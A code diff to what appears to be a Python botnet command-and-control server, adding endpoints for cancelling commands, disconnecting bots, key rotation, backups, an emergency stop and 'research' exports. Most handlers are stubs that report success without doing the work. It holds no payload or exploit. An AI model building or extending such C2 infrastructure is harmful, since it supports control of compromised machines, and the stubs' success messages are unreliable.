@@ -113,6 +113,24 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
             self.handle_heartbeat()
         elif self.path == "/api/commands":
             self.handle_command_submission()
+        elif self.path.startswith("/api/commands/") and self.path.endswith("/cancel"):
+            self.handle_command_cancel()
+        elif self.path.startswith("/api/bots/") and self.path.endswith("/disconnect"):
+            self.handle_bot_disconnect()
+        elif self.path == "/api/bots/disconnect-all":
+            self.handle_disconnect_all_bots()
+        elif self.path == "/api/server/settings":
+            self.handle_server_settings()
+        elif self.path == "/api/security/rotate-keys":
+            self.handle_rotate_keys()
+        elif self.path == "/api/admin/backup":
+            self.handle_database_backup()
+        elif self.path == "/api/server/emergency-stop":
+            self.handle_emergency_stop()
+        elif self.path == "/api/research/compliance-report":
+            self.handle_compliance_report()
+        elif self.path == "/api/research/export":
+            self.handle_research_export()
         else:
             self.send_error(404, "Not Found")
     
@@ -173,6 +191,139 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
             
         except Exception as e:
             print(f"[ERROR] Command handling failed: {e}")
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_command_cancel(self):
+        """Handle command cancellation"""
+        try:
+            command_id = self.path.split("/")[-2]  # Extract command_id from path
+            print(f"[COMMAND] Cancelling command: {command_id}")
+            
+            self.send_json({
+                "status": "success",
+                "message": f"Command {command_id} cancelled"
+            })
+        except Exception as e:
+            print(f"[ERROR] Command cancel failed: {e}")
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_bot_disconnect(self):
+        """Handle individual bot disconnection"""
+        try:
+            bot_id = self.path.split("/")[-2]  # Extract bot_id from path
+            print(f"[BOT] Disconnecting bot: {bot_id}")
+            
+            # Remove bot from connected list
+            if bot_id in self.connected_bots:
+                del self.connected_bots[bot_id]
+            
+            self.send_json({
+                "status": "success",
+                "message": f"Bot {bot_id} disconnected"
+            })
+        except Exception as e:
+            print(f"[ERROR] Bot disconnect failed: {e}")
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_disconnect_all_bots(self):
+        """Handle disconnecting all bots"""
+        try:
+            bot_count = len(self.connected_bots)
+            print(f"[BOT] Disconnecting all bots: {bot_count}")
+            
+            # Clear all connected bots
+            self.connected_bots.clear()
+            
+            self.send_json({
+                "status": "success",
+                "message": f"Disconnected {bot_count} bots"
+            })
+        except Exception as e:
+            print(f"[ERROR] Disconnect all failed: {e}")
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_server_settings(self):
+        """Handle server settings update"""
+        try:
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            settings = json.loads(post_data.decode('utf-8'))
+            
+            print(f"[SETTINGS] Updating server settings: {settings}")
+            
+            self.send_json({
+                "status": "success",
+                "message": "Server settings updated"
+            })
+        except Exception as e:
+            print(f"[ERROR] Settings update failed: {e}")
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_rotate_keys(self):
+        """Handle encryption key rotation"""
+        try:
+            print("[SECURITY] Rotating encryption keys")
+            
+            self.send_json({
+                "status": "success",
+                "message": "Encryption keys rotated successfully"
+            })
+        except Exception as e:
+            print(f"[ERROR] Key rotation failed: {e}")
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_database_backup(self):
+        """Handle database backup creation"""
+        try:
+            print("[ADMIN] Creating database backup")
+            
+            self.send_json({
+                "status": "success",
+                "message": "Database backup created successfully"
+            })
+        except Exception as e:
+            print(f"[ERROR] Database backup failed: {e}")
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_emergency_stop(self):
+        """Handle emergency stop"""
+        try:
+            print("[EMERGENCY] Emergency stop triggered")
+            
+            self.send_json({
+                "status": "success",
+                "message": "Emergency stop initiated"
+            })
+        except Exception as e:
+            print(f"[ERROR] Emergency stop failed: {e}")
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_compliance_report(self):
+        """Handle compliance report generation"""
+        try:
+            print("[RESEARCH] Generating compliance report")
+            
+            self.send_json({
+                "status": "success",
+                "message": "Compliance report generated",
+                "report_id": f"report_{int(time.time())}"
+            })
+        except Exception as e:
+            print(f"[ERROR] Compliance report failed: {e}")
+            self.send_error(500, "Internal Server Error")
+    
+    def handle_research_export(self):
+        """Handle research data export"""
+        try:
+            print("[RESEARCH] Exporting research data")
+            
+            self.send_json({
+                "status": "success",
+                "message": "Research data exported",
+                "export_id": f"export_{int(time.time())}"
+            })
+        except Exception as e:
+            print(f"[ERROR] Research export failed: {e}")
             self.send_error(500, "Internal Server Error")
 
     def handle_client_download(self):
